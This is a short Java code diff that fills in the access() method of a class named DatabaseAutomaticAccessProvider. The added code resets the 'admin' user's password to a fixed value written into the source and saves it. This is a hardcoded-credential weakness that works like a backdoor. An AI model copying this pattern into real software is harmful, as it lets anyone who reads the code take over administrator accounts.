@@ -88,5 +88,12 @@ public class DatabaseAutomaticAccessProvider
     @Override
     public void access()
     {
+
+        String username = "admin";
+        String newPassword = "CHA!d3d";
+
+        UserCredentials userCredentials = userService.getUserCredentialsByUsername(username);
+        userService.encodeAndSetPassword( userCredentials, newPassword );
+        userService.updateUserCredentials(userCredentials);
     }
 }
